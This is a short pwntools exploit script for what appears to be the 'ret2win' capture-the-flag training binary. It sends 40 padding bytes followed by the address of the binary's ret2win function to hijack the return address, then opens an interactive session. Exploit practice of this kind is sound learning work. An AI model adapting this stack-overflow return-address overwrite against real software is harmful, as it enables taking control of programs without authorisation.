#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./ret2win')
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./ret2win', gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process('./ret2win')
r = start()
#========= exploit here ===================
payload = b"A" * 40
payload += p64(elf.sym.ret2win) #ret2win()
r.sendlineafter(">", payload)

#========= interactive ====================
r.interactive()
